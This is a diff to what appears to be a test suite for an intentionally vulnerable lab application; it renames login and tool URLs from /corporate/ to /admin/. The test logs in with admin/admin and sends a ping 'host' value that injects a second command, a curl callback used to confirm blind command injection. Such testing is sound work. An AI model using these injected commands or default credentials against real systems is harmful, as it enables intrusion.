@@ -56,10 +56,10 @@ def test_sqli_union_canary(server):
 
 def test_blind_command_injection_oast(server):
     s = S(server)
-    s.post(f"{server['base']}/corporate/login",
+    s.post(f"{server['base']}/admin/login",
            data={"username": "admin", "password": "admin"})
     tok = f"oob-{int(time.time()*1000)}"
-    s.post(f"{server['base']}/corporate/tools/ping",
+    s.post(f"{server['base']}/admin/tools/ping",
            data={"host": f"127.0.0.1; curl -s {server['base']}/collab/{tok}"})
     time.sleep(2)
     assert "blind-command-injection" in solved(server)
